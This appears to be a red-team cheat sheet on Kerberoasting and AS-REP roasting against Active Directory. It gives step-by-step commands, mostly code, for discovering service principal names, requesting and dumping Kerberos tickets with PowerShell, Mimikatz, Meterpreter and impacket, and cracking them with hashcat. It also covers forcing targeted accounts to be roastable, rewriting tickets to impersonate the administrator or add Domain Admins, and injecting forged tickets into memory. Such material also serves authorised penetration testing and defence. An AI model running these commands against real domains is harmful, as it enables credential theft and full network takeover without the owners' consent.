# Kerberosting /                                AS-REP Rosting

## <mark style="color:red;">Kerberosting</mark>

The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service is called Kerberoast. This is very common attack in red team engagements since it doesn’t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service. This is because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service.

Red Teams usually attempt to crack tickets which have higher possibility to be configured with a weak password. Successful cracking of the ticket will not only give access to the service but sometimes it can lead to full domain compromise as often services might run under the context of an elevated account. These tickets can be identified by considering a number of factors such as:

* SPNs bind to domain user accounts
* Password last set
* Password expiration
* Last logon

Specifically the Kerberoast attack involves five steps:

1. SPN Discovery
2. Request Service Tickets
3. Export Service Tickets
4. Crack Service Tickets
5. Rewrite Service Tickets & RAM Injection

The discovery of services in a network by querying the Active Directory for service principal names.

## <mark style="color:red;">SPN Discovery</mark>

Services that support Kerberos authentication require to have a Service Principal Name (SPN) associated to point users to the appropriate resource for connection. Discovery of SPNs inside an internal network is performed via LDAP queries and can assist red teams to identify hosts that are running important services such as Terminal, Exchange, Microsoft SQL etc. and being stealthy at the same time. Furthermore identification of SPNs is the first step to the kerberoasting attack.

### <mark style="color:orange;">Using SetSPN Binary</mark>

[SetSPN](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx) is a native windows binary which can be used to retrieve the mapping between user accounts and services. This utility can add, delete or view SPN registrations.

```
setspn -T megabank -Q */*
```

![](<../../../.gitbook/assets/image (178).png>)

Services that are bind to a domain user account and not a computer account are more likely configured with a weak password since the user has selected the password. Therefore services which they have their **Canonical-Name** to **Users** should be targeted for Kerberoasting. From the list of SPNs below the service **sql.megabank.local** is associated with a user account.

![](<../../../.gitbook/assets/image (176).png>)

### <mark style="color:orange;">Using Kerberost Toolkit</mark>

[kerberost](https://github.com/nidem/kerberoast) toolkit can be used to query the active directory to discover only services that are associated with a user account as a more focused approached compared to SetSPN.

```
. .\GetUserSPNs.ps1
```

![](<../../../.gitbook/assets/image (183).png>)

### <mark style="color:orange;">Using cscript.exe</mark>

There is also a VBS script which is part of the same tookit and can provide the same information. The script can be executed from the windows command prompt by using the native Windows binary **cscript**.

```
cscript.exe GetUserSPNs.vbs
```

### <mark style="color:orange;">Using Impacket</mark>

Service Principal Names can be also discovered from non-joined domain systems with the python version of **GetUserSPNs** which is part of impacket. **However valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used**.

```
./GetUserSPNs.py -dc-ip 192.168.56.208 megabank.local/client2:"password.321"
```

![](<../../../.gitbook/assets/image (182).png>)

### <mark style="color:orange;">Manual</mark>

```
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

**Targeted kerberoasting by setting SPN -**  We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

```
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
```

### <mark style="color:orange;">AS-REP roasting</mark> <a href="#as-rep-roasting" id="as-rep-roasting"></a>

Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:

```
Get-ASREPHash -UserName TargetUser
```

Crack the hash with Hashcat:

```
hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

**Targeted AS-REP roasting by disabling Kerberos pre-authentication -** Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

```
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
```



## <mark style="color:red;">Request Service Tickets</mark>

### <mark style="color:orange;">Using Powershell</mark>

The easiest method to request the service ticket for a specific SPN is through PowerShell as it has been introduced by [Tim Medin](https://twitter.com/timmedin) during his DerbyCon 4.0 [talk](https://www.youtube.com/watch?v=PUyhlN-E5MU).

```
# one ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "WINDC/sql.megabank.local:60111"


# all tickets
 Add-Type -AssemblyName System.IdentityModel 
 setspn.exe -T megabank.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

![](<../../../.gitbook/assets/image (180).png>)

Execution of the **klist** command will list all the available cached tickets.

```
klist
```

![](<../../../.gitbook/assets/image (177).png>)

### <mark style="color:orange;">Using Mimikatz</mark>

An alternative solution to request service tickets is through Mimikatz by specifying as a target the service principal name.

```
kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80
```

![](<../../../.gitbook/assets/image (175).png>)

Similarly to **klist** the list of Kerberos tickets that exist in memory can be retrieved through Mimikatz and save the output to a file:

```
kerberos::list /export
```

{% hint style="info" %}
Note that the service ticket file is binary. Keep this in mind when transferring it with a tool like Netcat, which may mangle it during transfer.
{% endhint %}

then we can use kerberost tool in kali to crack the service account ticket:

```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-megabank@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

### <mark style="color:orange;">Using Meterpreter KIWI</mark>

Alternatively loading the **Kiwi module (meterpreter)** will add some additional Mimikatz commands which can performed the same task.

```
load kiwi
kerberos_ticket_list
```

Or by executing a custom Kiwi command:

```
kiwi_cmd kerberos::list
```

### <mark style="color:orange;">Using Impacket</mark>

[Impacket](https://github.com/CoreSecurity/impacket) has a python module which can request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets. However requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain

```
./GetUserSPNs.py -request megabank.local/client2
```

### <mark style="color:orange;">Invoke-kerberost</mark>

#### The Invoke-Kerberoast.ps1 664 script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.

{% embed url="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" %}

## <mark style="color:red;">Cracking The Hash</mark>

### <mark style="color:orange;">Hashcat</mark>

The service account hashes will also retrieved in John the Ripper format or this hashcat command:

```
hashcat -a 0 -m 13100  hash.txt tools/wordlist/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt  --status
```

### [tgsrepcrack.py](https://github.com/leechristensen/tgscrack)

```
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### <mark style="color:orange;">Rewrite</mark>

Make user appear to be a different user

```
./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -u 500  
```

Add user to another group (in this case Domain Admin)

```
./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -g 512 
```

## <mark style="color:red;">Rewrite Service Tickets & RAM Injection</mark>

Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins.

```
python kerberoast.py -p Password123 -r megabank_001.kirbi -w megabank.kirbi -u 500
python kerberoast.py -p Password123 -r megabank_001.kirbi -w megabank.kirbi -g 512
```

The new ticket can be injected back into the memory with the following Mimikatz command in order to perform authentication with the targeted service via Kerberos protocol.

```
kerberos::ptt PENTESTLAB.kirbi
```

## <mark style="color:red;">Other Tools</mark>

{% embed url="https://github.com/cyberark/RiskySPN" %}

{% embed url="https://github.com/xan7r/kerberoast" %}

{% embed url="https://github.com/nidem/kerberoast" %}

{% embed url="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" %}
